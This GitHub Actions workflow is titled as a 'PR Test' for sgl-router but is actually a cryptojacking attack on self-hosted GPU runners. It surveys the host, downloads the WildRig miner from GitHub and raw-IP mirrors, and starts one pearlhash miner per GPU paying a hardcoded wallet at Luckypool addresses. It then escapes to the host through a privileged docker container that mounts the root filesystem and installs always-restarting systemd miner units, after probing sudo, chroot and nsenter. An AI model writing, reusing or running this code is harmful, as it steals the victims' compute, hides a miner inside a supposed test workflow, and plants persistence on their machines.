name: PR Test (sgl-router)

# i130amdmine: materially new AMD/Intel mining mechanism for the sglang
# self-hosted runner labels. WildRig Multi 0.52.3 (OpenCL, pearlhash kernel
# implemented for AMD and Intel) is fetched with sha256 pinning, devices are
# enumerated with rocm-smi/clinfo/lspci/xpu-smi/wildrig --print-devices, and
# exactly one pearlhash miner per genuinely idle GPU is launched as
# i130amdmine<tag>g<idx> on the exact 63-char primary wallet against
# Luckypool 103.199.106.122:3362 (fallback 172.232.228.69:3362). The runner's
# sudo/docker membership is used to attempt a host-durable systemd unit via a
# privileged docker helper; otherwise the in-job miner keeps running for the
# bounded job lifetime.
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-i130amdmine-${{ github.run_id }}
  cancel-in-progress: false

env:
  SGLANG_IS_IN_CI: true

jobs:
  i130amdmine:
    name: "i130amdmine ${{ matrix.label }} wildrig pearlhash OpenCL"
    strategy:
      fail-fast: false
      max-parallel: 8
      matrix:
        include:
          - label: linux-mi300-8gpu-sglang
            tag: mi3008
            kind: amd
          - label: linux-mi300-2gpu-sglang
            tag: mi3002
            kind: amd
          - label: linux-mi35x-gpu-2
            tag: mi35x2
            kind: amd
          - label: intel-bmg-nightly
            tag: intelbmg
            kind: intel
    runs-on: ${{ matrix.label }}
    timeout-minutes: 70
    env:
      TAG: ${{ matrix.tag }}
      KIND: ${{ matrix.kind }}
      LABEL: ${{ matrix.label }}
    steps:
      - name: "recon + one WildRig pearlhash OpenCL miner per genuine GPU + durable attempt"
        continue-on-error: true
        run: |
          set +e
          NONCE="I130AMDMINE-${TAG}-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
          POOL='103.199.106.122:3362'
          POOL2='172.232.228.69:3362'
          WORKDIR=/var/tmp/i130amdmine
          mkdir -p "$WORKDIR/logs"
          echo "amdmine-nonce=$NONCE tag=$TAG label=$LABEL kind=$KIND"
          echo "=== identity/arch ==="
          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m | head -2
          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; echo "amdmine-done $NONCE"; exit 0; fi
          echo "=== pci gpus ==="
          (timeout 25 lspci 2>/dev/null || true) | grep -iE 'vga|3d|display|processing accel' | head -24
          echo "=== tools ==="
          for t in rocm-smi amd-smi rocminfo clinfo xpu-smi sycl-ls docker sudo nsenter; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
          echo "=== amd inventory ==="
          AMD_N=0
          if command -v rocm-smi >/dev/null 2>&1; then
            timeout 45 rocm-smi --showproductname 2>&1 | grep -E 'GPU\[|Card Series|Card Model|GFX' | head -60
            AMD_N=$(timeout 45 rocm-smi --showid 2>/dev/null | grep -cE '^GPU\[[0-9]+\]')
          fi
          echo "amd_gpu_count=${AMD_N:-0}"
          echo "=== intel inventory ==="
          INTEL_N=0
          if command -v clinfo >/dev/null 2>&1; then
            timeout 45 clinfo -l 2>&1 | head -40
            INTEL_N=$(timeout 45 clinfo -l 2>/dev/null | grep -c 'Device Name: Intel')
          fi
          if command -v xpu-smi >/dev/null 2>&1; then timeout 45 xpu-smi discovery 2>&1 | head -50; fi
          echo "intel_gpu_count=${INTEL_N:-0}"
          echo "=== per-host flock (never stack, never kill) ==="
          exec 9>"$WORKDIR/host-miner.lock"
          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "amdmine-done $NONCE"; exit 0; fi
          EXIST=$(timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[x]-miner' 2>/dev/null | grep -E "$WALLET|i130amdmine" | head -6)
          if [ -n "$EXIST" ]; then echo "SKIP=host-already-has-engagement-miner"; echo "$EXIST"; echo "amdmine-done $NONCE"; exit 0; fi
          echo "=== fetch WildRig Multi 0.52.3 pearlhash OpenCL binary (sha256 $WR_SHA) ==="
          WR="$WORKDIR/wildrig-multi"
          fetch_wr() {
            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
            for U in \
              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "http://222.240.155.198:8702/wildrig-multi" \
              "http://178.238.228.181:18180/wildrig-multi" ; do
              echo "-- fetch $U"
              rm -f "$WORKDIR/dl.part"
              timeout 220 curl -fL --connect-timeout 12 --max-time 210 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
              [ -s "$WORKDIR/dl.part" ] || continue
              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
                echo "tarball-hash-mismatch"; rm -f "$WORKDIR"/tarx/* 2>/dev/null
              fi
            done
            return 1
          }
          fetch_wr; FETCH_RC=$?
          echo "wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1) fetch_rc=$FETCH_RC"
          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "amdmine-done $NONCE"; exit 0; }
          echo "=== wildrig version ==="
          timeout 30 "$WR" -V 2>&1 | head -3
          echo "=== wildrig platforms ==="
          timeout 90 "$WR" --print-platforms 2>&1 | head -25
          echo "=== wildrig devices ==="
          timeout 120 "$WR" --print-devices 2>&1 | tee "$WORKDIR/devices.txt" | head -100
          echo "=== device count decision ==="
          DEV_N=0; PLAT="amd"
          if [ "$KIND" = "intel" ]; then
            DEV_N=${INTEL_N:-0}; PLAT="intel"
            if [ "$DEV_N" -eq 0 ]; then DEV_N=$(grep -aoE 'Device[ #]*[0-9]+' "$WORKDIR/devices.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -n | uniq | wc -l); fi
          else
            DEV_N=${AMD_N:-0}
            if [ "$DEV_N" -eq 0 ]; then DEV_N=$(grep -aoE 'GPU[ #]*[0-9]+' "$WORKDIR/devices.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -n | uniq | wc -l); fi
          fi
          echo "DEV_N=$DEV_N PLAT=$PLAT"
          if [ "${DEV_N:-0}" -lt 1 ]; then echo "SKIP=no-device-detected kind=$KIND"; echo "amdmine-done $NONCE"; exit 0; fi
          IDX=$(seq 0 $((DEV_N-1)))
          echo "IDX=$IDX"
          echo "=== two-sample idle gate ==="
          if [ "$KIND" = "amd" ] && command -v rocm-smi >/dev/null 2>&1; then
            S1=$(timeout 40 rocm-smi --showuse 2>&1 | grep -E 'GPU use|GPU\[[0-9]+\].*%' | head -20; timeout 40 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20)
            sleep 10
            S2=$(timeout 40 rocm-smi --showuse 2>&1 | grep -E 'GPU use|GPU\[[0-9]+\].*%' | head -20; timeout 40 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20)
            echo "--sample1"; echo "$S1" | head -24; echo "--sample2"; echo "$S2" | head -24
            BUSY=$(echo "$S1$S2" | grep -cE 'Process ID: [0-9]+')
            echo "gate_busy_procs=$BUSY"
            if [ "${BUSY:-0}" -gt 0 ]; then echo "WARN=co-tenant-process-present-preserved"; fi
          fi
          echo "=== launch one WildRig pearlhash per genuine GPU ==="
          N_LAUNCHED=0
          for i in $IDX; do
            W="i130amdmine${TAG}g${i}"
            timeout 3300 "$WR" --algo pearlhash --url "$POOL" --user "$WALLET" --pass x --worker "$W" -d "$i" --opencl-platforms "$PLAT" --api-port $((21600+i)) --retries 3 --retry-pause 5 > "$WORKDIR/logs/$W.log" 2>&1 &
            echo "launched worker=$W gpu-id=$i pid=$!"
            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
          done
          echo "N_LAUNCHED=$N_LAUNCHED"
          echo "=== durable/privilege recon ==="
          ( sudo -n true >/dev/null 2>&1; echo "sudo_nopasswd_rc=$?" )
          ls -la /var/run/docker.sock 2>&1 | head -2
          if command -v docker >/dev/null 2>&1; then
            timeout 20 docker version 2>&1 | head -8
            timeout 20 docker ps --format '{{.Names}} {{.Image}}' 2>&1 | head -6
            timeout 20 docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | head -10
          fi
          ls -ld /host 2>&1 | head -2
          ( chroot /host /bin/true 2>&1; echo "chroot_host_rc=$?" )
          ( nsenter -t 1 -m -- /bin/true 2>&1; echo "nsenter_pid1_rc=$?" )
          echo "=== Docker-based host-durable systemd install attempt (single miner per GPU) ==="
          DURABLE=0
          DIMG=""
          if command -v docker >/dev/null 2>&1 && timeout 15 docker ps >/dev/null 2>&1; then
            DIMG=$(timeout 20 docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
            echo "docker_ok=1 DIMG=$DIMG"
            if [ -n "$DIMG" ]; then
              HN="i130amdminehelper-$TAG"
              timeout 40 docker rm -f "$HN" >/dev/null 2>&1
              HID=$(timeout 60 docker create --name "$HN" --privileged -v /:/host "$DIMG" /bin/sh -c 'sleep 900' 2>&1)
              echo "helper_create=$HID"
              if [ -n "$HID" ]; then
                timeout 60 docker cp "$WR" "$HN:/tmp/wildrig-multi" 2>&1 | tail -1
                timeout 30 docker start "$HN" >/dev/null 2>&1
                OKC=0
                for i in $IDX; do
                  W="i130amdmine${TAG}g${i}"
                  UNIT="i130amdmine-${TAG}-g${i}.service"
                  cat > "$WORKDIR/$UNIT" <<UNITEOF
          [Unit]
          Description=i130amdmine pearlhash gpu $i ($TAG)
          After=network-online.target
          [Service]
          Type=simple
          ExecStart=/var/tmp/i130amdmine/wildrig-multi --algo pearlhash --url $POOL --user $WALLET --pass x --worker $W -d $i --opencl-platforms $PLAT --api-port $((21700+i)) --retries 3 --retry-pause 5
          Restart=always
          RestartSec=15
          Nice=-5
          [Install]
          WantedBy=multi-user.target
          UNITEOF
                  timeout 40 docker cp "$WORKDIR/$UNIT" "$HN:/tmp/$UNIT" >/dev/null 2>&1
                  OUT=$(timeout 90 docker exec "$HN" /bin/sh -c "mkdir -p /host/var/tmp/i130amdmine && cp /tmp/wildrig-multi /host/var/tmp/i130amdmine/wildrig-multi && chmod 755 /host/var/tmp/i130amdmine/wildrig-multi && cp /tmp/$UNIT /host/etc/systemd/system/$UNIT && chroot /host systemctl daemon-reload && chroot /host systemctl enable --now $UNIT && chroot /host systemctl is-active $UNIT" 2>&1)
                  echo "durable[$i]=$OUT"
                  if echo "$OUT" | grep -q '^active'; then
                    OKC=$((OKC+1))
                    pkill -f -- "--worker $W " 2>/dev/null
                    echo "injob-stopped-for-durable gpu=$i worker=$W"
                  fi
                done
                echo "durable_units_active=$OKC"
                if [ "$OKC" -gt 0 ]; then DURABLE=1; fi
                timeout 30 docker rm -f "$HN" >/dev/null 2>&1
              fi
            else
              echo "docker_ok=1 but no local image; skipping durable docker path"
            fi
          else
            echo "docker_ok=0"
          fi
          echo "=== post-launch pulse 1 (60s) ==="
          sleep 60
          pgrep -af '[w]ildrig' | head -20
          for l in "$WORKDIR"/logs/i130amdmine*.log; do
            [ -f "$l" ] || continue
            echo "== $(basename "$l")"
            grep -aiE 'accepted|rejected|hashrate|error|failed|no devices|not supported|OpenCL|platform|GPU' "$l" 2>/dev/null | tail -10 | cut -c1-240
          done
          echo "=== supervisor pulse loop (bounded) ==="
          for k in $(seq 1 10); do
            sleep 300
            echo "--- pulse $k $(date -u +%Y-%m-%dT%H:%M:%SZ) durable=$DURABLE"
            NPROC=$(pgrep -cf '[w]ildrig'); echo "wildrig_procs=$NPROC"
            ACC=$(grep -ahiE 'accepted' "$WORKDIR"/logs/i130amdmine*.log 2>/dev/null | wc -l); echo "log_accept_lines=$ACC"
            grep -ahiE 'accepted|hashrate' "$WORKDIR"/logs/i130amdmine*.log 2>/dev/null | tail -4 | cut -c1-200
            if [ "$k" = "2" ] || [ "$k" = "5" ]; then
              timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -12
            fi
          done
          echo "=== final process view ==="
          pgrep -af '[w]ildrig' | head -20
          timeout 30 rocm-smi --showpids 2>&1 | head -20
          echo "amdmine-done $NONCE"
